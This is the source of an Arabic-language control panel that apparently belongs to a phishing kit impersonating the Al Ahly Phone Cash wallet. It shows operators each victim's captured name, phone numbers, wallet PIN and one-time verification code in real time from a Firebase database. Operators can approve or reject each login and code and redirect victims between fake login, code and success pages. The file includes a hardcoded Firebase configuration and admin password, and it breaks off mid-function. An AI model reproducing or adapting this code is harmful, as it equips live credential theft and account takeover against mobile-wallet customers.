<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>لوحة التحكم - محفظة الاهلي فون كاش</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }

    :root {
      --green-dark: #1a5c38;
      --green-main: #2e7d4f;
      --green-light: #e8f5e9;
      --green-border: #a5d6a7;
      --red: #c62828;
      --red-light: #ffebee;
      --orange: #e65100;
      --orange-light: #fff3e0;
      --gray: #f5f5f5;
      --text: #212121;
      --text-sub: #757575;
      --white: #ffffff;
      --shadow: 0 2px 12px rgba(0,0,0,0.10);
    }

    body {
      background: #f0f8ff;
      font-family: 'Segoe UI', Tahoma, sans-serif;
      color: var(--text);
      min-height: 100vh;
    }

    /* ===== LOGIN ===== */
    #loginScreen {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(160deg, #1a5c38 0%, #2e7d4f 60%, #0d3d22 100%);
    }
    .login-box {
      background: var(--white);
      border-radius: 18px;
      padding: 40px 32px;
      width: 340px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.25);
      text-align: center;
    }
    .login-box h2 { color: var(--green-dark); font-size: 22px; margin-bottom: 6px; }
    .login-box p { color: var(--text-sub); font-size: 13px; margin-bottom: 24px; }
    .login-box input {
      width: 100%; padding: 11px 14px;
      border: 1.5px solid #ddd; border-radius: 10px;
      font-size: 14px; margin-bottom: 14px;
      outline: none; text-align: right;
      transition: border-color 0.2s;
    }
    .login-box input:focus { border-color: var(--green-main); }
    .login-box button {
      width: 100%; padding: 12px;
      background: var(--green-main); color: #fff;
      border: none; border-radius: 10px;
      font-size: 15px; font-weight: 800; cursor: pointer;
    }
    .login-box button:hover { background: var(--green-dark); }
    .login-error { color: var(--red); font-size: 13px; margin-top: 10px; display: none; }

    /* ===== DASHBOARD ===== */
    #dashboard { display: none; min-height: 100vh; }

    /* HEADER */
    .header {
      background: var(--green-dark);
      color: #fff;
      padding: 0 24px;
      height: 58px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      position: sticky; top: 0; z-index: 100;
    }
    .header-left { display: flex; align-items: center; gap: 14px; }
    .header h1 { font-size: 18px; font-weight: 900; }
    .header-badge {
      background: rgba(255,255,255,0.15);
      border-radius: 20px;
      padding: 4px 12px;
      font-size: 12px;
      display: flex; align-items: center; gap: 6px;
    }
    .dot-live {
      width: 8px; height: 8px;
      background: #66bb6a;
      border-radius: 50%;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0%,100% { opacity:1; transform:scale(1); }
      50% { opacity:0.5; transform:scale(1.3); }
    }
    .header-right { display: flex; align-items: center; gap: 10px; }
    .btn-logout {
      background: rgba(255,255,255,0.15);
      border: none; color: #fff;
      padding: 6px 14px; border-radius: 8px;
      font-size: 13px; cursor: pointer;
    }
    .btn-logout:hover { background: rgba(255,255,255,0.25); }
    .btn-clear-all {
      background: var(--red);
      border: none; color: #fff;
      padding: 6px 14px; border-radius: 8px;
      font-size: 13px; cursor: pointer; font-weight: 700;
    }
    .btn-clear-all:hover { background: #b71c1c; }

    /* STATS BAR */
    .stats-bar {
      background: var(--white);
      border-bottom: 1px solid #e0e0e0;
      padding: 10px 24px;
      display: flex; gap: 20px;
    }
    .stat-item {
      display: flex; align-items: center; gap: 8px;
      font-size: 13px; color: var(--text-sub);
    }
    .stat-num { font-weight: 900; font-size: 16px; color: var(--green-dark); }
    .stat-num.red { color: var(--red); }
    .stat-num.orange { color: var(--orange); }

    /* LAYOUT */
    .layout {
      display: grid;
      grid-template-columns: 280px 1fr;
      height: calc(100vh - 98px);
    }

    /* SIDEBAR */
    .sidebar {
      background: var(--white);
      border-left: 1px solid #e0e0e0;
      overflow-y: auto;
    }
    .sidebar-header {
      padding: 14px 16px;
      font-size: 13px; font-weight: 800;
      color: var(--green-dark);
      border-bottom: 1px solid #e0e0e0;
      background: var(--green-light);
      position: sticky; top: 0;
    }

    /* VISITOR CARD IN SIDEBAR */
    .visitor-item {
      padding: 12px 14px;
      border-bottom: 1px solid #f0f0f0;
      cursor: pointer;
      transition: background 0.15s;
      position: relative;
    }
    .visitor-item:hover { background: #f0f8ff; }
    .visitor-item.active { background: var(--green-light); border-right: 3px solid var(--green-main); }
    .visitor-item.has-action { background: #fff8e1; }
    .visitor-item.has-action.active { background: #fff3cd; }

    .vi-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px; }
    .vi-name { font-size: 14px; font-weight: 800; color: var(--text); }
    .vi-time { font-size: 11px; color: var(--text-sub); }
    .vi-phone { font-size: 12px; color: var(--text-sub); margin-bottom: 4px; }
    .vi-page { font-size: 11px; color: var(--green-main); font-weight: 600; }

    .vi-status {
      display: inline-flex; align-items: center; gap: 4px;
      font-size: 11px; font-weight: 700;
      padding: 2px 8px; border-radius: 10px;
      margin-top: 4px;
    }
    .vi-status.waiting { background: #fff3e0; color: var(--orange); }
    .vi-status.approved { background: #e8f5e9; color: #1565c0; }
    .vi-status.otp { background: #f3e5f5; color: #6a1b9a; }
    .vi-status.done { background: var(--green-light); color: var(--green-dark); }
    .vi-status.rejected { background: var(--red-light); color: var(--red); }

    .action-badge {
      position: absolute;
      top: 10px; left: 10px;
      background: var(--orange);
      color: #fff;
      font-size: 10px; font-weight: 900;
      padding: 2px 7px; border-radius: 10px;
      animation: blink 1s infinite;
    }
    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }

    /* MAIN PANEL */
    .main-panel {
      padding: 20px;
      overflow-y: auto;
      background: #f0f8ff;
    }

    .empty-state {
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      height: 100%; color: var(--text-sub);
      gap: 12px;
    }
    .empty-state .icon { font-size: 52px; }
    .empty-state p { font-size: 15px; }

    /* VISITOR DETAIL BOX */
    .visitor-box {
      background: var(--white);
      border-radius: 16px;
      box-shadow: var(--shadow);
      overflow: hidden;
      max-width: 700px;
    }

    .vb-header {
      background: linear-gradient(135deg, var(--green-dark), var(--green-main));
      color: #fff;
      padding: 18px 22px;
      display: flex; align-items: center; justify-content: space-between;
    }
    .vb-header-left h2 { font-size: 20px; font-weight: 900; margin-bottom: 4px; }
    .vb-header-left .vb-page {
      font-size: 12px; opacity: 0.85;
      display: flex; align-items: center; gap: 5px;
    }
    .vb-header-right { text-align: left; }
    .vb-time { font-size: 12px; opacity: 0.8; }
    .status-dot {
      display: inline-block;
      width: 10px; height: 10px;
      border-radius: 50%;
      margin-left: 6px;
      vertical-align: middle;
      flex-shrink: 0;
    }
    .status-dot.online  { background: #22c55e; box-shadow: 0 0 6px #22c55e; }
    .status-dot.offline { background: #9ca3af; }

    .vb-body { padding: 20px 22px; }

    /* INFO ROWS */
    .info-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 18px;
    }
    .info-item {
      background: var(--gray);
      border-radius: 10px;
      padding: 12px 14px;
    }
    .info-item .label {
      font-size: 11px; color: var(--text-sub);
      font-weight: 700; margin-bottom: 4px;
    }
    .info-item .value {
      font-size: 15px; font-weight: 800; color: var(--text);
      word-break: break-all;
    }
    .info-item.full { grid-column: 1 / -1; }

    /* STATUS BADGE */
    .status-badge {
      display: inline-flex; align-items: center; gap: 6px;
      padding: 6px 14px; border-radius: 20px;
      font-size: 13px; font-weight: 800;
    }
    .status-badge.waiting { background: var(--orange-light); color: var(--orange); }
    .status-badge.approved { background: #e8f5e9; color: #1565c0; }
    .status-badge.otp_submitted { background: #f3e5f5; color: #6a1b9a; }
    .status-badge.final_approved { background: var(--green-light); color: var(--green-dark); }
    .status-badge.final_rejected,
    .status-badge.rejected { background: var(--red-light); color: var(--red); }

    /* ACTIONS SECTION */
    .actions-section {
      border-top: 1px solid #f0f0f0;
      padding-top: 16px;
      margin-top: 4px;
    }
    .actions-title {
      font-size: 13px; font-weight: 800;
      color: var(--text-sub); margin-bottom: 12px;
    }

    .action-group { margin-bottom: 14px; }
    .action-group-label {
      font-size: 12px; color: var(--text-sub);
      margin-bottom: 8px; font-weight: 700;
    }
    .btn-row { display: flex; gap: 10px; flex-wrap: wrap; }

    .btn-approve {
      flex: 1; padding: 11px;
      background: var(--green-main); color: #fff;
      border: none; border-radius: 10px;
      font-size: 14px; font-weight: 800; cursor: pointer;
      transition: background 0.2s;
    }
    .btn-approve:hover { background: var(--green-dark); }

    .btn-reject {
      flex: 1; padding: 11px;
      background: var(--red); color: #fff;
      border: none; border-radius: 10px;
      font-size: 14px; font-weight: 800; cursor: pointer;
      transition: background 0.2s;
    }
    .btn-reject:hover { background: #b71c1c; }

    .btn-delete {
      width: 100%; padding: 10px;
      background: #fff; color: var(--red);
      border: 1.5px solid var(--red); border-radius: 10px;
      font-size: 13px; font-weight: 800; cursor: pointer;
      margin-top: 10px;
      transition: all 0.2s;
    }
    .btn-delete:hover { background: var(--red-light); }

    /* REDIRECT SECTION */
    .redirect-section {
      background: var(--green-light);
      border: 1.5px solid var(--green-border);
      border-radius: 12px;
      padding: 14px 16px;
      margin-bottom: 14px;
    }
    .redirect-section label {
      font-size: 13px; font-weight: 800;
      color: var(--green-dark); display: block; margin-bottom: 8px;
    }
    .redirect-row { display: flex; gap: 8px; }
    .redirect-select {
      flex: 1; padding: 9px 12px;
      border: 1.5px solid var(--green-border);
      border-radius: 8px; font-size: 13px;
      outline: none; background: #fff;
      color: var(--text);
    }
    .btn-redirect {
      padding: 9px 16px;
      background: var(--green-main); color: #fff;
      border: none; border-radius: 8px;
      font-size: 13px; font-weight: 800; cursor: pointer;
    }
    .btn-redirect:hover { background: var(--green-dark); }

    /* OTP DISPLAY */
    .otp-display {
      background: #f3e5f5;
      border: 1.5px solid #ce93d8;
      border-radius: 12px;
      padding: 14px 16px;
      margin-bottom: 14px;
      display: none;
    }
    .otp-display.show { display: block; }
    .otp-display .otp-label {
      font-size: 12px; color: #6a1b9a; font-weight: 700; margin-bottom: 6px;
    }
    .otp-display .otp-value {
      font-size: 28px; font-weight: 900;
      color: #4a148c; letter-spacing: 8px;
      text-align: center; padding: 8px 0;
    }

    /* HISTORY LOG */
    .history-section {
      margin-top: 16px;
      border-top: 1px solid #f0f0f0;
      padding-top: 14px;
    }
    .history-title {
      font-size: 13px; font-weight: 800;
      color: var(--text-sub); margin-bottom: 10px;
    }
    .history-item {
      display: flex; align-items: flex-start; gap: 10px;
      margin-bottom: 8px; font-size: 12px;
    }
    .history-dot {
      width: 8px; height: 8px; border-radius: 50%;
      background: var(--green-main); margin-top: 3px; flex-shrink: 0;
    }
    .history-dot.red { background: var(--red); }
    .history-dot.orange { background: var(--orange); }
    .history-dot.purple { background: #6a1b9a; }
    .history-text { color: var(--text); }
    .history-time { color: var(--text-sub); margin-right: auto; }

    /* NOTIFICATION TOAST */
    .toast-container {
      position: fixed; top: 70px; left: 20px;
      z-index: 9999; display: flex; flex-direction: column; gap: 8px;
    }
    .toast {
      background: var(--green-dark);
      color: #fff;
      padding: 12px 18px;
      border-radius: 12px;
      font-size: 13px; font-weight: 700;
      box-shadow: 0 4px 20px rgba(0,0,0,0.25);
      display: flex; align-items: center; gap: 10px;
      animation: slideIn 0.3s ease;
      max-width: 300px;
    }
    .toast.action { background: var(--orange); }
    @keyframes slideIn {
      from { transform: translateX(-100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }

    /* SCROLLBAR */
    ::-webkit-scrollbar { width: 5px; }
    ::-webkit-scrollbar-track { background: #f0f0f0; }
    ::-webkit-scrollbar-thumb { background: var(--green-border); border-radius: 10px; }
  
    /* CLEAR CHAT BUTTON & DROPDOWN */
    .btn-clear-chat {
      background: #ff9800;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 9px 18px;
      font-size: 14px;
      cursor: pointer;
      font-family: inherit;
      margin-top: 8px;
      width: 100%;
      transition: background 0.2s;
    }
    .btn-clear-chat:hover { background: #e65100; }
    .clear-chat-menu {
      display: none;
      position: absolute;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: 0 4px 16px rgba(0,0,0,0.15);
      z-index: 999;
      min-width: 200px;
      overflow: hidden;
      right: 0;
    }
    .clear-chat-menu.open { display: block; }
    .clear-chat-menu button {
      display: block;
      width: 100%;
      padding: 12px 16px;
      background: none;
      border: none;
      text-align: right;
      font-size: 14px;
      cursor: pointer;
      font-family: inherit;
      color: #333;
      transition: background 0.15s;
    }
    .clear-chat-menu button:hover { background: #f5f5f5; }
    .clear-chat-menu button.danger { color: #d32f2f; }
    .visitor-item .vi-checkbox {
      display: none;
      margin-left: 8px;
      width: 18px;
      height: 18px;
      cursor: pointer;
      accent-color: #4caf50;
      flex-shrink: 0;
      vertical-align: middle;
    }
    body.selection-mode .visitor-item .vi-checkbox { display: inline-block; }
    body.selection-mode .visitor-item { cursor: default; }
    .selection-toolbar {
      display: none;
      padding: 10px 14px;
      background: #fff3e0;
      border-bottom: 1px solid #ffcc80;
      align-items: center;
      justify-content: space-between;
      gap: 8px;
    }
    body.selection-mode .selection-toolbar { display: flex; }
    .selection-toolbar span { font-size: 13px; color: #e65100; font-weight: 600; }
    .selection-toolbar button {
      border: none;
      border-radius: 6px;
      padding: 6px 12px;
      font-size: 13px;
      cursor: pointer;
      font-family: inherit;
    }
    .btn-sel-delete { background: #d32f2f; color: #fff; }
    .btn-sel-cancel { background: #eee; color: #333; }

    </style>
</head>
<body>

<!-- ===== TOAST CONTAINER ===== -->
<div class="toast-container" id="toastContainer"></div>

<!-- ===== LOGIN ===== -->
<div id="loginScreen">
  <div class="login-box">
    <h2>🏦 لوحة التحكم</h2>
    <p>محفظة الاهلي فون كاش</p>
    <input type="text" id="adminUser" placeholder="اسم المستخدم"/>
    <input type="password" id="adminPass" placeholder="كلمة المرور"/>
    <button onclick="doLogin()">دخول</button>
    <div class="login-error" id="loginError">❌ بيانات غير صحيحة</div>
  </div>
</div>

<!-- ===== DASHBOARD ===== -->
<div id="dashboard">

  <!-- HEADER -->
  <div class="header">
    <div class="header-left">
      <h1>⚙️ لوحة التحكم</h1>
      <div class="header-badge">
        <div class="dot-live"></div>
        <span id="headerStatus">متصل</span>
      </div>
    </div>
    <div class="header-right">
      <button class="btn-clear-all" onclick="clearAllSessions()">🗑 مسح الكل</button>
      <button class="btn-logout" onclick="doLogout()">خروج</button>
    </div>
  </div>

  <!-- STATS BAR -->
  <div class="stats-bar">
    <div class="stat-item">
      <span>إجمالي الزوار:</span>
      <span class="stat-num" id="statTotal">0</span>
    </div>
    <div class="stat-item">
      <span>ينتظرون:</span>
      <span class="stat-num orange" id="statWaiting">0</span>
    </div>
    <div class="stat-item">
      <span>مكتملون:</span>
      <span class="stat-num" id="statDone">0</span>
    </div>
    <div class="stat-item">
      <span>مرفوضون:</span>
      <span class="stat-num red" id="statRejected">0</span>
    </div>
  </div>

  <!-- LAYOUT -->
  <div class="layout">

    <!-- SIDEBAR -->
    <div class="sidebar">
      <div class="sidebar-header">📋 قائمة الزوار</div>
      <div class="selection-toolbar">
        <span id="selCount">0 محدد</span>
        <div style="display:flex;gap:6px;">
          <button class="btn-sel-delete" onclick="deleteSelected()">🗑 حذف المحدد</button>
          <button class="btn-sel-cancel" onclick="cancelSelection()">❌ إلغاء</button>
        </div>
      </div>
      <div id="visitorList"></div>
    </div>

    <!-- MAIN PANEL -->
    <div class="main-panel" id="mainPanel">
      <div class="empty-state">
        <div class="icon">👥</div>
        <p>اختر زائراً من القائمة لعرض تفاصيله</p>
      </div>
    </div>

  </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
  import { getDatabase, ref, onValue, update, remove, get } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBYOUNmTyszdG6ICkE5kyRVz_RrRGKQw4A",
    authDomain: "alahly-9357f-eb12e.firebaseapp.com",
    databaseURL: "https://alahly-9357f-eb12e-default-rtdb.firebaseio.com",
    projectId: "alahly-9357f-eb12e",
    storageBucket: "alahly-9357f-eb12e.appspot.com",
    messagingSenderId: "YOUR_SENDER_ID",
    appId: "YOUR_APP_ID"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  // ===== PAGES LIST =====
  const PAGES = [
    { value: 'landing', label: 'صفحة البداية' },
    { value: 'personal', label: 'المعلومات الشخصية' },
    { value: 'login', label: 'بيانات المحفظة' },
    { value: 'otp', label: 'رمز التحقق' },
    { value: 'success', label: 'صفحة النجاح' },
    { value: 'error', label: 'صفحة الخطأ' },
  ];

  let sessions = {};
  let selectedId = null;
  let knownIds = new Set();
  let knownStatuses = {};

  // ===== AUDIO ALERTS =====
  function playSound(type) {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);

    if (type === 'new') {
      osc.frequency.setValueAtTime(880, ctx.currentTime);
      osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
      gain.gain.setValueAtTime(0.3, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
      osc.start(ctx.currentTime);
      osc.stop(ctx.currentTime + 0.4);
    } else {
      osc.frequency.setValueAtTime(660, ctx.currentTime);
      osc.frequency.setValueAtTime(880, ctx.currentTime + 0.15);
      gain.gain.setValueAtTime(0.3, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
      osc.start(ctx.currentTime);
      osc.stop(ctx.currentTime + 0.5);
    }
  }

  // ===== TOAST =====
  function showToast(msg, type = 'new') {
    const container = document.getElementById('toastContainer');
    const toast = document.createElement('div');
    toast.className = `toast ${type === 'action' ? 'action' : ''}`;
    toast.innerHTML = `${type === 'new' ? '🔔' : '⚡'} ${msg}`;
    container.appendChild(toast);
    setTimeout(() => toast.remove(), 4000);
  }

  // ===== STATUS LABEL =====
  function statusLabel(s) {
    const map = {
      waiting: ['⏳ انتظار', 'waiting'],
      approved: ['✅ موافق على الدخول', 'approved'],
      rejected: ['❌ مرفوض', 'rejected'],
      otp_submitted: ['🔢 أدخل OTP', 'otp'],
      final_approved: ['🎉 مكتمل', 'done'],
      final_rejected: ['❌ OTP مرفوض', 'rejected'],
    };
    return map[s] || [s, 'waiting'];
  }

  function pageLabel(p) {
    const map = {
      landing: 'صفحة البداية',
      personal: 'المعلومات الشخصية',
      login: 'بيانات المحفظة',
      otp: 'رمز التحقق',
      success: 'صفحة النجاح',
      error: 'صفحة الخطأ',
    };
    return map[p] || p || 'غير معروف';
  }

  function formatTime(ts) {
    if (!ts) return '';
    const d = new Date(ts);
    return d.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
  }

  // ===== RENDER SIDEBAR =====
  function renderSidebar() {
    const list = document.getElementById('visitorList');
    // Sort: has pending action first, then by lastAction desc
    const sorted = Object.entries(sessions).sort((a, b) => {
      const aAction = ['waiting','otp_submitted'].includes(a[1].status);
      const bAction = ['waiting','otp_submitted'].includes(b[1].status);
      if (aAction && !bAction) return -1;
      if (!aAction && bAction) return 1;
      return (b[1].lastAction || b[1].timestamp || 0) - (a[1].lastAction || a[1].timestamp || 0);
    });

    list.innerHTML = '';
    sorted.forEach(([id, data], idx) => {
      const [label, cls] = statusLabel(data.status);
      const hasAction = ['waiting','otp_submitted'].includes(data.status);
      const div = document.createElement('div');
      div.className = `visitor-item ${selectedId === id ? 'active' : ''} ${hasAction ? 'has-action' : ''}`;
      div.onclick = () => selectVisitor(id);
      div.innerHTML = `
        ${hasAction ? '<div class="action-badge">يحتاج رد</div>' : ''}
        <div class="vi-top">
          <div class="vi-name">${data.name || 'زائر #' + (idx+1)}</div>
          <div class="vi-time">${formatTime(data.lastAction || data.timestamp)}</div>
        </div>
        <div class="vi-phone">${data.phone || data.personalPhone || '---'}</div>
        <div class="vi-page">📍 ${pageLabel(data.currentPage)}</div>
        <div><span class="vi-status ${cls}">${label}</span></div>
      `;
      const cb = document.createElement('input');
      cb.type = 'checkbox';
      cb.className = 'vi-checkbox';
      cb.dataset.id = id;
      cb.onclick = (e) => { e.stopPropagation(); updateSelCount(); };
      div.insertBefore(cb, div.firstChild);
      // Prevent click on item when in selection mode
      const origOnclick = div.onclick;
      div.onclick = (e) => { if (document.body.classList.contains('selection-mode')) { cb.checked = !cb.checked; updateSelCount(); } else if (origOnclick) origOnclick(e); };
      list.appendChild(div);
    });

    // Stats
    const all = Object.values(sessions);
    document.getElementById('statTotal').textContent = all.length;
    document.getElementById('statWaiting').textContent = all.filter(s => ['waiting','otp_submitted'].includes(s.status)).length;
    document.getElementById('statDone').textContent = all.filter(s => s.status === 'final_approved').length;
    document.getElementById('statRejected').textContent = all.filter(s => ['rejected','final_rejected'].includes(s.status)).length;
  }

  // ===== SELECT VISITOR =====
  window.selectVisitor = function(id) {
    selectedId = id;
    renderSidebar();
    renderDetail(id);
  }

  // ===== RENDER DETAIL =====
  function renderDetail(id) {
    const data = sessions[id];
    if (!data) return;
    const panel = document.getElementById('mainPanel');
    const [statusText, statusCls] = statusLabel(data.status);

    const showOTP = data.status === 'otp_submitted' && data.otp && data.otp !== '---';

    // Build history
    const history = data.history || [];
    const historyHTML = history.slice().reverse().map(h => {
      const dotCls = h.type === 'reject' ? 'red' : h.type === 'action' ? 'orange' : h.type === 'otp' ? 'purple' : '';
      return `<div class="history-item">
        <div class="history-dot ${dotCls}"></div>
        <div class="history-text">${h.msg}</div>
        <div class="history-time">${formatTime(h.ts)}</div>
      </div>`;
    }).join('');

    // Pages dropdown
    const pagesOptions = PAGES.map(p =>
      `<option value="${p.value}">${p.label}</option>`
    ).join('');

    panel.innerHTML = `
      <div class="visitor-box">
        <div class="vb-header">
          <div class="vb-header-left">
            <h2 style="display:flex;align-items:center;gap:6px;">
              ${data.name || 'زائر'}
              <span class="status-dot ${(Date.now() - (data.lastAction || data.timestamp)) < 30000 ? 'online' : 'offline'}" title="${(Date.now() - (data.lastAction || data.timestamp)) < 30000 ? 'متصل الآن' : 'غير متصل'}"></span>
            </h2>
            <div class="vb-page">📍 ${pageLabel(data.currentPage)} &nbsp;|&nbsp; ${data.currentUrl || ''}</div>
          </div>
          <div class="vb-header-right">
            <div class="vb-time">🕐 ${formatTime(data.timestamp)}</div>
            <div style="margin-top:6px;font-size:12px;opacity:0.9;background:rgba(255,255,255,0.15);border-radius:6px;padding:3px 8px;text-align:center;">🖥️ ${pageLabel(data.currentPage)}</div>
          </div>
        </div>

        <div class="vb-body">

          <!-- INFO GRID -->
          <div class="info-grid">
            <div class="info-item">
              <div class="label">الاسم</div>
              <div class="value">${data.name || '---'}</div>
            </div>
            <div class="info-item">
              <div class="label">رقم الهاتف الشخصي</div>
              <div class="value">${data.personalPhone || '---'}</div>
            </div>
            <div class="info-item">
              <div class="label">رقم المحفظة</div>
              <div class="value">${data.phone || '---'}</div>
            </div>
            <div class="info-item">
              <div class="label">الرقم السري</div>
              <div class="value">${data.pin || '---'}</div>
            </div>
            <div class="info-item">
              <div class="label">الحالة</div>
              <div class="value"><span class="status-badge ${statusCls}">${statusText}</span></div>
            </div>
            <div class="info-item">
              <div class="label">الصفحة الحالية</div>
              <div class="value">${pageLabel(data.currentPage)}</div>
            </div>
            ${data.currentUrl ? `
            <div class="info-item full">
              <div class="label">الرابط الحالي</div>
              <div class="value" style="font-size:12px;">${data.currentUrl}</div>
            </div>` : ''}
          </div>

          <!-- OTP DISPLAY -->
          <div class="otp-display ${showOTP ? 'show' : ''}">
            <div class="otp-label">🔢 رمز التحقق المُدخل من الزائر:</div>
            <div class="otp-value">${data.otp || '---'}</div>
          </div>

          <!-- REDIRECT -->
          <div class="redirect-section">
            <label>🔀 إعادة توجيه الزائر إلى:</label>
            <div class="redirect-row">
              <select class="redirect-select" id="redirectSelect">
                <option value="">-- اختر الصفحة --</option>
                ${pagesOptions}
              </select>
              <button class="btn-redirect" onclick="redirectVisitor('${id}')">توجيه ←</button>
            </div>
          </div>

          <!-- ACTIONS -->
          <div class="actions-section">
            <div class="actions-title">⚡ الإجراءات</div>

            ${data.status === 'waiting' ? `
            <div class="action-group">
              <div class="action-group-label">مرحلة تسجيل الدخول:</div>
              <div class="btn-row">
                <button class="btn-approve" onclick="approveLogin('${id}')">✅ قبول الدخول</button>
                <button class="btn-reject" onclick="rejectLogin('${id}')">❌ رفض الدخول</button>
              </div>
            </div>` : ''}

            ${data.status === 'otp_submitted' ? `
            <div class="action-group">
              <div class="action-group-label">مرحلة رمز التحقق:</div>
              <div class="btn-row">
                <button class="btn-approve" onclick="approveOTP('${id}')">✅ قبول الرمز</button>
                <button class="btn-reject" onclick="rejectOTP('${id}')">❌ رفض الرمز</button>
              </div>
            </div>` : ''}

            <button class="btn-delete" onclick="deleteSession('${id}')">🗑 حذف هذه الجلسة</button>
            <div style="position:relative;margin-top:4px;">
              <button class="btn-clear-chat" onclick="toggleClearMenu(event, '${id}')">🧹 مسح المحادثات</button>
              <div class="clear-chat-menu" id="clearMenu_${id}">
                <button class="danger" onclick="clearAllChats('${id}')">🗑 مسح جميع المحادثات</button>
                <button onclick="enterSelectionMode()">☑️ حدد المحادثات</button>
              </div>
            </div>
          </div>

          <!-- HISTORY -->
          ${history.length > 0 ? `
          <div class="history-section">
            <div class="history-title">📜 سجل الإجراءات</div>
            ${historyHTML}
          </div>` : ''}

        </div>
      </div>
    `;
  }

  // ===== ACTIONS =====
  function addHistory(id, msg, type) {
    const data = sessions[id];
    const history = data.history || [];
    history.push({ msg, type, ts: Date.now() });
    update(ref(db, `site1/sessions/${id}`), { history, lastAction: Date.now() });
  }

  window.approveLogin = function(id) {
    update(ref(db, `site1/sessions/${id}`), { status: 'approved', lastAction: Date.now() });
    addHistory(id, 'تم قبول تسجيل الدخول', 'approve');
  }
  window.rejectLogin = function(id) {
    update(ref(db, `site1/sessions/${id}`), { status: 'rejected', lastAction: Date.now() });
    addHistory(id, 'تم رفض تسجيل الدخول', 'reject');
  }
  window.approveOTP = function(id) {
    update(ref(db, `site1/sessions/${id}`), { status: 'final_approved', lastAction: Date.now() });
    addHistory(id, 'تم قبول رمز التحقق', 'approve');
  }
  window.rejectOTP = function(id) {
    update(ref(db, `site1/sessions/${id}`), { status: 'final_rejected', lastAction: Date.now() });
    addHistory(id, 'تم رفض رمز التحقق', 'reject');
  }

  window.redirectVisitor = function(id) {
    const sel = document.getElementById('redirectSelect');
    const page = sel.value;
    if (!page) return;
    update(ref(db, `site1/sessions/${id}`), { redirectTo: page, lastAction: Date.now() });
    addHistory(id, `تم توجيه الزائر إلى: ${pageLabel(page)}`, 'action');
    showToast(`تم توجيه الزائر إلى ${pageLabel(page)}`, 'action');
  }

  window.deleteSession = function(id) {
    if (!confirm('هل تريد حذف هذه الجلسة؟')) return;
    remove(ref(db, `site1/sessions/${id}`));
    if (selectedId === id) {
      selectedId = null;
      document.getElementById('mainPanel').innerHTML = `
        <div class="empty-state">
          <div class="icon">👥</div>
          <p>اختر زائراً من القائمة لعرض تفاصيله</p>
        </div>`;
    }
  }

  window.clearAllSessions = function() {
    if (!confirm('هل تريد مسح جميع الجلسات؟')) return;
    remove(ref(db, 'site1/sessions'));
    selectedId = null;
    sessions = {};
    document.getElementById('mainPanel').innerHTML = `
      <div class="empty-state">
        <div class="icon">👥</div>
        <p>اختر زائراً من القائمة لعرض تفاصيله</p>
      </div>`;
  }

  // ===== FIREBASE LISTENER =====
  function startListening() {
    onValue(ref(db, 'site1/sessions'), (snap) => {
      const data = snap.val() || {};

      // Detect new visitors
      Object.keys(data).forEach(id => {
        if (!knownIds.has(id)) {
          knownIds.add(id);
          if (knownIds.size > 1) { // skip first load
            playSound('new');
            showToast(`زائر جديد دخل الموقع: ${data[id].name || data[id].phone || 'مجهول'}`, 'new');
          }
        }
        // Detect new actions
        if (knownStatuses[id] && knownStatuses[id] !== data[id].status) {
          const actionStatuses = ['waiting', 'otp_submitted'];
          if (actionStatuses.includes(data[id].status)) {
            playSound('action');
            showToast(`${data[id].name || 'زائر'} قام بإجراء جديد: ${statusLabel(data[id].status)[0]}`, 'action');
          }
        }
        knownStatuses[id] = data[id].status;
      });

      sessions = data;
      renderSidebar();
      if (selectedId && sessions[selectedId]) {
        renderDetail(selectedId);
      }
    });
  }

  // ===== LOGIN =====
  window.doLogin = function() {
    const u = document.getElementById('adminUser').value;
    const p = document.getElementById('adminPass').value;
    if (u === 'admin' && p === 'ahly2024') {
      document.getElementById('loginScreen').style.display = 'none';
      document.getElementById('dashboard').style.display = 'block';
      startListening();
    } else {
      document.getElementById('loginError').style.display = 'block';
    }
  }

  window.doLogout = function() {
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('loginScreen').style.display = 'flex';
    sessions = {}; knownIds = new Set(); knownStatuses = {};
  }

    // ===== CLEAR CHAT FUNCTIONS =====
    window.toggleClearMenu = function(e, id) {
      e.stopPropagation();
      document.querySelectorAll('.clear-chat-menu').forEach(function(m) {
        if (m.id !== 'clearMenu_' + id) m.classList.remove('open');
      });
      var menu = document.getElementById('clearMenu_' + id);
      if (menu) menu.classList.toggle('open');
    }
    document.addEventListener('click', function() {
      document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
    });

    window.clearAllChats = function(sessionId) {
      if (!confirm('هل أنت متأكد من مسح جميع المحادثات لهذه الجلسة؟')) return;
      firebase.database().ref('site1/sessions/' + sessionId + '/messages').remove().then(function() {
        document.querySelectorAll('.clear-chat-menu').forEach(function(m) { m.classList.remove('open'); });
        alert('تم مسح جميع المحادثات بنجاح');
        renderDetail(sessionId);
      });
    }

    window.enterSelectionMode = function() {
